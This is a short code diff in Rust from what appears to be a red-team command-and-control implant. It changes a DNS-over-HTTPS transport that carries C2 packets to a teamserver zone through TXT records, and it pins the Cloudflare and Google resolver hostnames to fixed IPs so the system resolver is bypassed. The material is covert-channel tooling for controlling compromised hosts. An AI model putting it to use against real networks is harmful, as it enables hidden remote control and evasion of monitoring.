@@ -33,6 +33,7 @@
 //! chunks, processing the C2 packet, and publishing downlink TXT records
 //! (see issue `red-cell-c2-XXXX` for the teamserver DNS handler).
 
+use std::net::SocketAddr;
 use std::time::Duration;
 
 use tracing::{debug, trace, warn};
@@ -90,7 +91,21 @@ impl DohTransport {
     /// `c2_domain` is the authoritative zone handled by the teamserver's DNS
     /// listener (e.g. `"c2.example.com"`).
     pub fn new(c2_domain: String, provider: DohProvider) -> Result<Self, SpecterError> {
+        // Pin DoH provider hostnames to their well-known IPs so reqwest never calls
+        // the system resolver (getaddrinfo).  On some Windows VMs, Tokio's
+        // spawn_blocking for system DNS resolution panics with os error 193
+        // (ERROR_BAD_EXE_FORMAT) when the thread pool can't start a worker thread.
+        // Using the stable public IPs avoids that code path entirely while keeping
+        // correct TLS hostname validation and SNI.
+        let cf_addr: SocketAddr = "1.1.1.1:443"
+            .parse()
+            .map_err(|e| SpecterError::Transport(format!("Cloudflare IP parse failed: {e}")))?;
+        let goog_addr: SocketAddr = "8.8.8.8:443"
+            .parse()
+            .map_err(|e| SpecterError::Transport(format!("Google DNS IP parse failed: {e}")))?;
         let client = reqwest::Client::builder()
+            .resolve("cloudflare-dns.com", cf_addr)
+            .resolve("dns.google", goog_addr)
             .timeout(Duration::from_secs(10))
             .build()
             .map_err(|e| SpecterError::Transport(format!("DoH client build failed: {e}")))?;
